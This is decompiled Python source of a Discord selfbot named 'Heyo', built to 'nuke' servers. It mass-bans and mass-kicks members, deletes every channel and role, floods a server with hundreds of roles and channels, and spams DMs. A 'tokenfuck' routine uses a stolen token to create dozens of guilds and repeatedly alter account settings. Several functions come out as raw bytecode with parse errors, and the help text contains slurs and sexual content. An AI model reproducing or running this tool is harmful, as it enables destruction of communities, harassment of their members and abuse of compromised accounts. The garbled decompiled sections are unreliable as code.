# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.5.0 (v3.5.0:374f501f4567, Sep 13 2015, 02:16:59) [MSC v.1900 32 bit (Intel)]
# Embedded file name: hi.py
import requests, threading, os, colorama, ctypes, time, discord, asyncio, codecs, sys, io, random, tcping
from tcping import Ping
from discord.ext import commands
from discord.ext.commands import Bot
import pyfiglet
from pyfiglet import Figlet
from colorama import Fore, Style, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

def resetnuke():
    print('')
    rudone = input('type 1 if ur done with this')
    if rudone == '1':
        os.system('cls')
        nukingshit()
    else:
        os.system('cls')
        nukingshit()


def selfbotlauncher():
    print('')
    print('Token')
    tokeninput = input('> ')
    tokens = [tokeninput]
    print('')
    print('Prefix')
    prefixselecter = input('> ')

    def banner():
        ctypes.windll.kernel32.SetConsoleTitleW('[Welcome to Heyo]')
        print(Fore.MAGENTA + 'Loading')
        os.system('cls')
        print('                  ' + Style.RESET_ALL + ' ┌─┐┌─┐┬  ┌─┐┌┐ ┌─┐┌┬┐')
        print('                  ' + Style.RESET_ALL + ' └─┐├┤ │  ├┤ ├┴┐│ │ │')
        print('                 ' + Style.RESET_ALL + '  └─┘└─┘┴─┘└  └─┘└─┘ ┴' + Fore.MAGENTA + ' ifs runs you')

    class SelfBot(commands.Cog):

        def __init__(self, client):
            self.client = client

        @commands.Cog.listener()
        async def on_connect(self):
            print('        ' + Fore.MAGENTA + '[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']')
            print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + ' ' + Fore.MAGENTA + ' ' + Style.RESET_ALL + '                                   ' + Fore.MAGENTA + '    ')
            print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + 'User          ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' ' + self.client.user.name + Fore.MAGENTA + '             ')
            print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '              ' + Fore.MAGENTA + ' ' + Style.RESET_ALL + '                          ' + Fore.MAGENTA + '')
            print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + 'Prefix        ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' ' + client.command_prefix + Fore.MAGENTA + '                       ')
            print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + ' ' + Fore.MAGENTA + '  ' + Style.RESET_ALL + '                                      ' + Fore.MAGENTA + '')
            print('       ' + Fore.MAGENTA + ' [' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']' + Style.RESET_ALL)
            print('                                                                                       ')

        @commands.command()
        async def ghostping(self, ctx):
            await ctx.message.delete()

        @commands.command()
        async def ioncannon(self, ctx):
            await ctx.message.delete()
            await ctx.send(';;ban')
            time.sleep(10)
            await ctx.send(';;dchannels')
            await ctx.send(';;droles')
            time.sleep(5)
            await ctx.send(';;dm Heyo ioncannons a bitch ass server')
            await ctx.send(';;roles Heyo ioncannons a bitch ass server')
            await ctx.send(';;channels Heyo ioncannons a bitch ass server')

        @commands.command()
        async def dmall(ctx, *, message):
            await ctx.message.delete()
            for user in list(ctx.guild.members):
                try:
                    await asyncio.sleep(5)
                    await user.send(message)
                except:
                    pass

        @commands.command()
        async def mban(self, ctx):
            await ctx.message.delete()
            for user in list(ctx.guild.members):
                try:
                    await user.ban()
                except:
                    pass

        @commands.command()
        async def mkick(self, ctx):
            await ctx.message.delete()
            for user in list(ctx.guild.members):
                try:
                    await user.kick()
                except:
                    pass

        @commands.command()
        async def mroles--- This code section failed: ---

 L. 114         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L. 115        16  LOAD_GLOBAL              range
               18  LOAD_CONST               900
               20  CALL_FUNCTION_1       1  ''
               22  GET_ITER         
               24  FOR_ITER             80  'to 80'
               26  STORE_FAST               '_i'

 L. 116        28  SETUP_FINALLY        62  'to 62'

 L. 117        30  LOAD_FAST                'ctx'
               32  LOAD_ATTR                guild
               34  LOAD_ATTR                create_role
               36  LOAD_FAST                'message'
               38  LOAD_GLOBAL              discord
               40  LOAD_METHOD              Color
               42  LOAD_CONST               9699539
               44  CALL_METHOD_1         1  ''
               46  LOAD_CONST               ('name', 'color')
               48  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               50  GET_AWAITABLE    
               52  LOAD_CONST               None
               54  YIELD_FROM       
               56  POP_TOP          
               58  POP_BLOCK        
               60  JUMP_BACK            24  'to 24'
             62_0  COME_FROM_FINALLY    28  '28'

 L. 118        62  POP_TOP          
               64  POP_TOP          
               66  POP_TOP          

 L. 119        68  POP_EXCEPT       
               70  POP_TOP          
               72  LOAD_CONST               None
               74  RETURN_VALUE     
               76  END_FINALLY      
               78  JUMP_BACK            24  'to 24'

Parse error at or near `POP_TOP' instruction at offset 70

        @commands.command()
        async def mchannels--- This code section failed: ---

 L. 123         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L. 124        16  LOAD_GLOBAL              range
               18  LOAD_CONST               900
               20  CALL_FUNCTION_1       1  ''
               22  GET_ITER         
               24  FOR_ITER             72  'to 72'
               26  STORE_FAST               '_i'

 L. 125        28  SETUP_FINALLY        54  'to 54'

 L. 126        30  LOAD_FAST                'ctx'
               32  LOAD_ATTR                guild
               34  LOAD_ATTR                create_text_channel
               36  LOAD_FAST                'message'
               38  LOAD_CONST               ('name',)
               40  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               42  GET_AWAITABLE    
               44  LOAD_CONST               None
               46  YIELD_FROM       
               48  POP_TOP          
               50  POP_BLOCK        
               52  JUMP_BACK            24  'to 24'
             54_0  COME_FROM_FINALLY    28  '28'

 L. 127        54  POP_TOP          
               56  POP_TOP          
               58  POP_TOP          

 L. 128        60  POP_EXCEPT       
               62  POP_TOP          
               64  LOAD_CONST               None
               66  RETURN_VALUE     
               68  END_FINALLY      
               70  JUMP_BACK            24  'to 24'

Parse error at or near `POP_TOP' instruction at offset 62

        @commands.command()
        async def dchannels--- This code section failed: ---

 L. 132         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L. 133        16  LOAD_GLOBAL              list
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                guild
               22  LOAD_ATTR                channels
               24  CALL_FUNCTION_1       1  ''
               26  GET_ITER         
               28  FOR_ITER             70  'to 70'
               30  STORE_FAST               'channel'

 L. 134        32  SETUP_FINALLY        52  'to 52'

 L. 135        34  LOAD_FAST                'channel'
               36  LOAD_METHOD              delete
               38  CALL_METHOD_0         0  ''
               40  GET_AWAITABLE    
               42  LOAD_CONST               None
               44  YIELD_FROM       
               46  POP_TOP          
               48  POP_BLOCK        
               50  JUMP_BACK            28  'to 28'
             52_0  COME_FROM_FINALLY    32  '32'

 L. 136        52  POP_TOP          
               54  POP_TOP          
               56  POP_TOP          

 L. 137        58  POP_EXCEPT       
               60  POP_TOP          
               62  LOAD_CONST               None
               64  RETURN_VALUE     
               66  END_FINALLY      
               68  JUMP_BACK            28  'to 28'

Parse error at or near `POP_TOP' instruction at offset 60

        @commands.command()
        async def droles(self, ctx):
            await ctx.message.delete()
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                except:
                    pass

        @commands.command()
        async def spam(ctx, amount: int, *, message):
            await ctx.message.delete()
            for _i in range(amount):
                await ctx.send(message)

        @commands.command()
        async def spam(self, ctx, amount: int, message):
            await ctx.message.delete()
            for i in range(amount):
                await ctx.send(message)

        @commands.command()
        async def avatar(self, ctx, user=None):
            await ctx.message.delete()
            em = discord.Embed(author=(user.mention), color=(discord.Color(9699539)))
            em.set_author(name=(str(user) + "'𝘴 𝘱𝘧𝘱"), icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            em.set_image(url=(user.avatar_url))
            em.set_footer(text='Heyo')
            await ctx.send(embed=em)
            print(' ' + client.user.name + Style.RESET_ALL + ' avatared ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def ipinfo(self, ctx, *, ipaddr='1.3.3.7'):
            await ctx.message.delete()
            r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}")
            geo = r.json()
            em = discord.Embed(color=(discord.Color(9699539)))
            fields = [
             {'name':'`IP`', 
              'value':geo['query']},
             {'name':'`ipType`', 
              'value':geo['ipType']},
             {'name':'`ISP`', 
              'value':geo['isp']},
             {'name':'`Region`', 
              'value':geo['region']},
             {'name':'`City`', 
              'value':geo['city']},
             {'name':'`Continent`', 
              'value':geo['continent']},
             {'name':'`Country`', 
              'value':geo['country']},
             {'name':'`Org`', 
              'value':geo['org']},
             {'name':'`Status', 
              'value':geo['status']}]
            for field in fields:
                if field['value']:
                    em.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
                    em.add_field(name=(field['name']), value=(field['value']), inline=True)
                    em.set_footer(text='ifs#0420')
                return await ctx.send(embed=em)

        @commands.command()
        async def purge(self, ctx, amount):
            await ctx.message.delete()
            async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
                try:
                    await message.delete()
                except:
                    pass

        @commands.command(pass_context=True)
        async def typing(self, ctx, *, text):
            global cycling
            await ctx.message.delete()
            cycling = True
            while cycling:
                name = ''
                for letter in text:
                    name = name + letter
                    await ctx.message.author.edit(nick=name)

        @commands.command(pass_context=True)
        async def info(self, ctx, member: discord.Member=None):
            embed = discord.Embed(color=(discord.Color(9699539)))
            embed.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            embed.add_field(name='`𝗜𝗗:`', value=(member.id), inline=False)
            embed.add_field(name='`𝗡𝗮𝗺𝗲:`', value=(member.display_name), inline=False)
            embed.add_field(name='`𝗖𝗿𝗲𝗮𝘁𝗶𝗼𝗻 𝗗𝗮𝘁𝗲:`', value=(member.created_at.strftime('%a, %d %B %Y, %I:%M %p')), inline=False)
            embed.add_field(name='`𝗕𝗼𝘁 𝗖𝗵𝗲𝗰𝗸:`', value=(member.bot), inline=False)
            embed.set_thumbnail(url=(member.avatar_url))
            embed.set_footer(text='ifs#0420')
            await ctx.send(embed=embed)
            await ctx.message.delete()

        @commands.command()
        async def streaming(self, ctx, *, message):
            await ctx.message.delete()
            stream = discord.Streaming(name=message,
              url='https://www.twitch.tv/superiorbuds420')
            await client.change_presence(activity=stream)

        @commands.command()
        async def watching(self, ctx, *, message):
            await ctx.message.delete()
            await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching),
              name=message))

        @commands.command()
        async def listening(self, ctx, *, message):
            await ctx.message.delete()
            await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening),
              name=message))

        @commands.command()
        async def playing(self, ctx, *, message):
            await ctx.message.delete()
            game = discord.Game(name=message)
            await client.change_presence(activity=game)

        @commands.command()
        async def tokenfuck--- This code section failed: ---

 L. 265         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L. 267        16  LOAD_STR                 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7'

 L. 268        18  LOAD_STR                 'application/json'

 L. 269        20  LOAD_FAST                '_token'

 L. 266        22  LOAD_CONST               ('User-Agent', 'Content-Type', 'Authorization')
               24  BUILD_CONST_KEY_MAP_3     3 
               26  STORE_FAST               'headers'

 L. 271        28  LOAD_GLOBAL              requests
               30  LOAD_METHOD              Session
               32  CALL_METHOD_0         0  ''
               34  STORE_FAST               'request'

 L. 273        36  LOAD_STR                 'light'

 L. 274        38  LOAD_STR                 'ja'

 L. 275        40  LOAD_CONST               False

 L. 276        42  LOAD_CONST               False

 L. 277        44  LOAD_CONST               False

 L. 278        46  LOAD_CONST               False

 L. 279        48  LOAD_CONST               False

 L. 280        50  LOAD_CONST               False

 L. 281        52  LOAD_CONST               False

 L. 282        54  LOAD_CONST               False

 L. 283        56  LOAD_CONST               False

 L. 284        58  LOAD_STR                 '0'

 L. 285        60  LOAD_STR                 'invisible'

 L. 272        62  LOAD_CONST               ('theme', 'locale', 'message_display_compact', 'inline_embed_media', 'inline_attachment_media', 'gif_auto_play', 'render_embeds', 'render_reactions', 'animate_emoji', 'convert_emoticons', 'enable_tts_command', 'explicit_content_filter', 'status')
               64  BUILD_CONST_KEY_MAP_13    13 
               66  STORE_FAST               'payload'

 L. 288        68  LOAD_STR                 '敗者heyo敗者'

 L. 289        70  LOAD_STR                 'https://cdn.discordapp.com/attachments/699828368840982578/702719106406809610/giphy.gif'

 L. 290        72  LOAD_STR                 'heyo just shit on u'

 L. 291        74  LOAD_STR                 'europe'

 L. 287        76  LOAD_CONST               ('channels', 'icon', 'name', 'region')
               78  BUILD_CONST_KEY_MAP_4     4 
               80  STORE_FAST               'guild'

 L. 293        82  LOAD_GLOBAL              range
               84  LOAD_CONST               50
               86  CALL_FUNCTION_1       1  ''
               88  GET_ITER         
               90  FOR_ITER            112  'to 112'
               92  STORE_FAST               '_i'

 L. 294        94  LOAD_GLOBAL              requests
               96  LOAD_ATTR                post
               98  LOAD_STR                 'https://discordapp.com/api/v6/guilds'
              100  LOAD_FAST                'headers'
              102  LOAD_FAST                'guild'
              104  LOAD_CONST               ('headers', 'json')
              106  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              108  POP_TOP          
              110  JUMP_BACK            90  'to 90'

 L. 296       112  SETUP_FINALLY       134  'to 134'

 L. 297       114  LOAD_FAST                'request'
              116  LOAD_ATTR                patch
              118  LOAD_STR                 'https://canary.discordapp.com/api/v6/users/@me/settings'
              120  LOAD_FAST                'headers'
              122  LOAD_FAST                'payload'
              124  LOAD_CONST               ('headers', 'json')
              126  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              128  POP_TOP          
              130  POP_BLOCK        
              132  BREAK_LOOP          204  'to 204'
            134_0  COME_FROM_FINALLY   112  '112'

 L. 298       134  DUP_TOP          
              136  LOAD_GLOBAL              Exception
              138  COMPARE_OP               exception-match
              140  POP_JUMP_IF_FALSE   198  'to 198'
              142  POP_TOP          
              144  STORE_FAST               'e'
              146  POP_TOP          
              148  SETUP_FINALLY       186  'to 186'

 L. 299       150  LOAD_GLOBAL              print
              152  LOAD_GLOBAL              Fore
              154  LOAD_ATTR                RED
              156  FORMAT_VALUE          0  ''
              158  LOAD_STR                 'error: '
              160  LOAD_GLOBAL              Fore
              162  LOAD_ATTR                LIGHTYELLOW_EX
              164  FORMAT_VALUE          0  ''
              166  LOAD_FAST                'e'
              168  FORMAT_VALUE          0  ''
              170  BUILD_STRING_4        4 
              172  LOAD_GLOBAL              Fore
              174  LOAD_ATTR                RESET
              176  BINARY_ADD       
              178  CALL_FUNCTION_1       1  ''
              180  POP_TOP          
              182  POP_BLOCK        
              184  BEGIN_FINALLY    
            186_0  COME_FROM_FINALLY   148  '148'
              186  LOAD_CONST               None
              188  STORE_FAST               'e'
              190  DELETE_FAST              'e'
              192  END_FINALLY      
              194  POP_EXCEPT       
              196  JUMP_BACK           112  'to 112'
            198_0  COME_FROM           140  '140'
              198  END_FINALLY      

 L. 301       200  BREAK_LOOP          204  'to 204'
              202  JUMP_BACK           112  'to 112'

 L. 302       204  LOAD_GLOBAL              cycle
              206  LOAD_STR                 'light'
              208  LOAD_STR                 'dark'
              210  BUILD_LIST_2          2 
              212  CALL_FUNCTION_1       1  ''
              214  STORE_FAST               'modes'

 L. 303       216  LOAD_GLOBAL              cycle
              218  LOAD_STR                 'online'
              220  LOAD_STR                 'idle'
              222  LOAD_STR                 'dnd'
              224  LOAD_STR                 'invisible'
              226  BUILD_LIST_4          4 
              228  CALL_FUNCTION_1       1  ''
              230  STORE_FAST               'statuses'

 L. 306       232  LOAD_GLOBAL              next
              234  LOAD_FAST                'modes'
              236  CALL_FUNCTION_1       1  ''

 L. 307       238  LOAD_GLOBAL              next
              240  LOAD_FAST                'statuses'
              242  CALL_FUNCTION_1       1  ''

 L. 305       244  LOAD_CONST               ('theme', 'status')
              246  BUILD_CONST_KEY_MAP_2     2 
              248  STORE_FAST               'setting'

 L. 310       250  SETUP_FINALLY       274  'to 274'

 L. 311       252  LOAD_FAST                'request'
              254  LOAD_ATTR                patch
              256  LOAD_STR                 'https://canary.discordapp.com/api/v6/users/@me/settings'
              258  LOAD_FAST                'headers'
              260  LOAD_FAST                'setting'
              262  LOAD_CONST               10
              264  LOAD_CONST               ('headers', 'json', 'timeout')
              266  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
              268  POP_TOP          
              270  POP_BLOCK        
              272  JUMP_FORWARD        342  'to 342'
            274_0  COME_FROM_FINALLY   250  '250'

 L. 312       274  DUP_TOP          
              276  LOAD_GLOBAL              Exception
              278  COMPARE_OP               exception-match
          280_282  POP_JUMP_IF_FALSE   340  'to 340'
              284  POP_TOP          
              286  STORE_FAST               'e'
              288  POP_TOP          
              290  SETUP_FINALLY       328  'to 328'

 L. 313       292  LOAD_GLOBAL              print
              294  LOAD_GLOBAL              Fore
              296  LOAD_ATTR                RED
              298  FORMAT_VALUE          0  ''
              300  LOAD_STR                 'error: '
              302  LOAD_GLOBAL              Fore
              304  LOAD_ATTR                LIGHTYELLOW_EX
              306  FORMAT_VALUE          0  ''
              308  LOAD_FAST                'e'
              310  FORMAT_VALUE          0  ''
              312  BUILD_STRING_4        4 
              314  LOAD_GLOBAL              Fore
              316  LOAD_ATTR                RESET
              318  BINARY_ADD       
              320  CALL_FUNCTION_1       1  ''
              322  POP_TOP          
              324  POP_BLOCK        
              326  BEGIN_FINALLY    
            328_0  COME_FROM_FINALLY   290  '290'
              328  LOAD_CONST               None
              330  STORE_FAST               'e'
              332  DELETE_FAST              'e'
              334  END_FINALLY      
              336  POP_EXCEPT       
              338  JUMP_BACK           250  'to 250'
            340_0  COME_FROM           280  '280'
              340  END_FINALLY      
            342_0  COME_FROM           272  '272'

 L. 315       342  CONTINUE            232  'to 232'
              344  JUMP_BACK           250  'to 250'
              346  JUMP_BACK           232  'to 232'

Parse error at or near `JUMP_BACK' instruction at offset 196

        @commands.command()
        async def help(self, ctx):
            await ctx.message.delete()
            helpem = discord.Embed(color=(discord.Color(9699539)))
            helpem.set_author(name='Heyo')
            helpem.set_thumbnail(url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            helpem.add_field(name='`𝗩𝗮𝗻𝗶𝘁𝘆`', value='𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴 𝘵𝘩𝘢𝘵 𝘦𝘧𝘧𝘦𝘤𝘵 𝘩𝘰𝘸 𝘺𝘰𝘶𝘳 𝘱𝘳𝘰𝘧𝘪𝘭𝘦 𝘭𝘰𝘰𝘬𝘴.', inline=False)
            helpem.add_field(name='`𝗡𝘂𝗸𝗶𝗻𝗴`', value='𝘛𝘰𝘰𝘭𝘴 𝘧𝘰𝘳 𝘯𝘶𝘬𝘪𝘯𝘨.', inline=False)
            helpem.add_field(name='`𝗨𝘁𝗶𝗹𝘀`', value='𝘈𝘭𝘭 𝘵𝘩𝘦 𝘶𝘵𝘪𝘭𝘪𝘵𝘺𝘴 𝘵𝘩𝘢𝘵 𝘺𝘰𝘶 𝘯𝘦𝘦𝘥.', inline=False)
            helpem.add_field(name='`𝗙𝘂𝗻`', value='𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴 𝘧𝘰𝘳 𝘺𝘰𝘶 𝘳𝘰𝘭𝘦𝘱𝘭𝘢𝘺𝘦𝘳𝘴.', inline=False)
            helpem.set_footer(text='ifs#0420')
            await ctx.send(embed=helpem)

        @commands.command()
        async def fun(self, ctx):
            await ctx.message.delete()
            helpem = discord.Embed(color=(discord.Color(9699539)))
            helpem.set_author(name='Heyo')
            helpem.set_thumbnail(url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            helpem.add_field(name='`𝗙𝘂𝗹𝗹𝘀𝗲𝗻𝗱`', value='𝘍𝘶𝘭𝘭𝘴𝘦𝘯𝘥 𝘸𝘪𝘵𝘩 𝘵𝘩𝘦 𝘣𝘰𝘺𝘴.', inline=False)
            helpem.add_field(name='`𝗣𝗮𝗰𝗸`', value='𝘊𝘩𝘢𝘵 𝘱𝘢𝘤𝘬 𝘵𝘩𝘢𝘵 𝘧𝘢𝘨.', inline=False)
            helpem.add_field(name='`𝗛𝘂𝗴`', value='𝘎𝘪𝘷𝘦 𝘢 𝘩𝘶𝘨 𝘵𝘰 𝘴𝘰𝘮𝘦𝘰𝘯𝘦.', inline=False)
            helpem.add_field(name='`𝗣𝗮𝘁`', value='𝘗𝘢𝘵 𝘵𝘩𝘦𝘮 𝘰𝘯 𝘢 𝘩𝘦𝘢𝘥. *𝘸𝘩𝘰𝘭𝘦𝘴𝘰𝘮𝘦*', inline=False)
            helpem.add_field(name='`𝗞𝗶𝗹𝗹`', value='𝘒𝘪𝘭𝘭 𝘵𝘩𝘦𝘳𝘦 𝘣𝘪𝘵𝘤𝘩𝘢𝘴𝘴.', inline=False)
            helpem.add_field(name='`𝗔𝗻𝗮𝗹`', value='𝘎𝘪𝘷𝘦 𝘵𝘩𝘦𝘮 𝘢𝘯𝘢𝘭.', inline=False)
            helpem.add_field(name='`𝗕𝗹𝗼𝘄𝗷𝗼𝗯`', value='𝘎𝘪𝘷𝘦 𝘵𝘩𝘦𝘮 𝘢 𝘣𝘭𝘰𝘸𝘪𝘦.', inline=False)
            helpem.add_field(name='`𝗙𝘂𝗰𝗸`', value='𝘏𝘪𝘵 𝘵𝘩𝘢𝘵 𝘣𝘪𝘵𝘤𝘩 𝘧𝘳𝘰𝘮 𝘵𝘩𝘦 𝘣𝘢𝘤𝘬.', inline=False)
            helpem.set_footer(text='Command usage: [cmd] [person]')
            await ctx.send(embed=helpem)

        @commands.command()
        async def vanity(self, ctx):
            await ctx.message.delete()
            helpem = discord.Embed(color=(discord.Color(9699539)))
            helpem.set_author(name='Heyo')
            helpem.set_thumbnail(url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            helpem.add_field(name='`𝗦𝘁𝗿𝗲𝗮𝗺𝗶𝗻𝗴`', value='𝘚𝘦𝘵𝘴 𝘺𝘰𝘶𝘳 𝘴𝘵𝘢𝘵𝘶𝘴 𝘵𝘰 𝘴𝘵𝘳𝘦𝘢𝘮𝘪𝘯𝘨.', inline=False)
            helpem.add_field(name='`𝗣𝗹𝗮𝘆𝗶𝗻𝗴`', value='𝘚𝘦𝘵𝘴 𝘺𝘰𝘶𝘳 𝘴𝘵𝘢𝘵𝘶𝘴 𝘵𝘰 𝘱𝘭𝘢𝘺𝘪𝘯𝘨.', inline=False)
            helpem.add_field(name='`𝗪𝗮𝘁𝗰𝗵𝗶𝗻𝗴`', value='𝘚𝘦𝘵𝘴 𝘺𝘰𝘶𝘳 𝘴𝘵𝘢𝘵𝘶𝘴 𝘵𝘰 𝘸𝘢𝘵𝘤𝘩𝘪𝘯𝘨.', inline=False)
            helpem.add_field(name='`𝗟𝗶𝘀𝘁𝗲𝗻𝗶𝗻𝗴`', value='𝘚𝘦𝘵𝘴 𝘺𝘰𝘶𝘳 𝘴𝘵𝘢𝘵𝘶𝘴 𝘵𝘰 𝘭𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨.', inline=False)
            helpem.add_field(name='`𝗧𝘆𝗽𝗶𝗻𝗴`', value='𝘔𝘢𝘬𝘦𝘴 𝘢 𝘵𝘺𝘱𝘪𝘯𝘨 𝘦𝘧𝘧𝘦𝘤𝘵 𝘢𝘴 𝘺𝘰𝘶𝘳 𝘯𝘪𝘤𝘬𝘯𝘢𝘮𝘦 𝘪𝘯 𝘴𝘦𝘳𝘷𝘦𝘳𝘴.', inline=False)
            helpem.set_footer(text='ifs#0420')
            await ctx.send(embed=helpem)

        @commands.command()
        async def utils(self, ctx):
            await ctx.message.delete()
            helpem = discord.Embed(color=(discord.Color(9699539)))
            helpem.set_author(name='Heyo')
            helpem.set_thumbnail(url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            helpem.add_field(name='`𝗦𝗽𝗮𝗺`', value='𝘚𝘱𝘢𝘮 𝘵𝘩𝘦 𝘢𝘮𝘰𝘶𝘯𝘵 𝘰𝘧 𝘮𝘦𝘴𝘴𝘢𝘨𝘦𝘴 𝘸𝘢𝘯𝘵𝘦𝘥 𝘢𝘯𝘥 𝘵𝘩𝘦 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘺𝘰𝘶 𝘸𝘢𝘯𝘵 𝘴𝘱𝘢𝘮𝘮𝘦𝘥.', inline=False)
            helpem.add_field(name='`𝗚𝗵𝗼𝘀𝘁𝗽𝗶𝗻𝗴`', value="𝘛𝘩𝘪𝘴 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘸𝘪𝘭𝘭 𝘥𝘦𝘭𝘦𝘵𝘦 𝘳𝘪𝘨𝘩𝘵 𝘸𝘩𝘦𝘯 𝘪𝘵'𝘴 𝘴𝘦𝘯𝘵 𝘶𝘴𝘦𝘥 𝘧𝘰𝘳 𝘨𝘩𝘰𝘴𝘵 𝘱𝘪𝘯𝘨.", inline=False)
            helpem.add_field(name='`𝗥𝗲𝗮𝗱`', value='𝘙𝘦𝘮𝘰𝘷𝘦 𝘢𝘭𝘭 𝘯𝘰𝘵𝘪𝘧𝘪𝘤𝘢𝘵𝘪𝘰𝘯𝘴 𝘪𝘯 𝘺𝘰𝘶𝘳 𝘥𝘮𝘴.', inline=False)
            helpem.add_field(name='`𝗔𝘃𝗮𝘁𝗮𝗿`', value='𝘚𝘩𝘰𝘸 𝘵𝘩𝘦 𝘢𝘷𝘢𝘵𝘢𝘳 𝘰𝘧 𝘢 𝘶𝘴𝘦𝘳.', inline=False)
            helpem.add_field(name='`𝗨𝘀𝗲𝗿𝗶𝗻𝗳𝗼`', value='𝘛𝘰 𝘤𝘩𝘦𝘤𝘬 𝘪𝘧 𝘵𝘩𝘢𝘵 𝘬𝘪𝘥 𝘪𝘴 𝘢 𝘯𝘦𝘸𝘨𝘦𝘯.', inline=False)
            helpem.set_footer(text='ifs#0420')
            await ctx.send(embed=helpem)

        @commands.command()
        async def nuking(self, ctx):
            await ctx.message.delete()
            helpem = discord.Embed(color=(discord.Color(9699539)))
            helpem.set_author(name='Heyo')
            helpem.set_thumbnail(url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            helpem.add_field(name='`𝗺𝗯𝗮𝗻`', value='𝘔𝘢𝘴𝘴 𝘣𝘢𝘯𝘴 𝘦𝘷𝘦𝘳𝘺𝘰𝘯𝘦 𝘪𝘯 𝘵𝘩𝘦 𝘴𝘦𝘳𝘷𝘦𝘳.', inline=False)
            helpem.add_field(name='`𝗺𝗸𝗶𝗰𝗸`', value='𝘔𝘢𝘴𝘴 𝘬𝘪𝘤𝘬𝘴 𝘦𝘷𝘦𝘳𝘺𝘰𝘯𝘦 𝘪𝘯 𝘵𝘩𝘦 𝘴𝘦𝘳𝘷𝘦𝘳.', inline=False)
            helpem.add_field(name='`𝗺𝗿𝗼𝗹𝗲𝘀`', value='𝘔𝘢𝘴𝘴 𝘤𝘳𝘦𝘢𝘵𝘦𝘴 𝘳𝘰𝘭𝘦𝘴.', inline=False)
            helpem.add_field(name='`𝗺𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀`', value='𝘔𝘢𝘴𝘴 𝘤𝘳𝘦𝘢𝘵𝘦𝘴 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴.', inline=False)
            helpem.add_field(name='`𝗱𝗿𝗼𝗹𝗲𝘀`', value='𝘔𝘢𝘴𝘴 𝘥𝘦𝘭𝘦𝘵𝘦𝘴 𝘳𝘰𝘭𝘦𝘴.', inline=False)
            helpem.add_field(name='`𝗱𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀`', value='𝘔𝘢𝘴𝘴 𝘥𝘦𝘭𝘦𝘵𝘦𝘴 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴.', inline=False)
            helpem.set_footer(text='ifs#0420')
            await ctx.send(embed=helpem)

        @commands.command()
        async def hug(self, ctx, user):
            await ctx.message.delete()
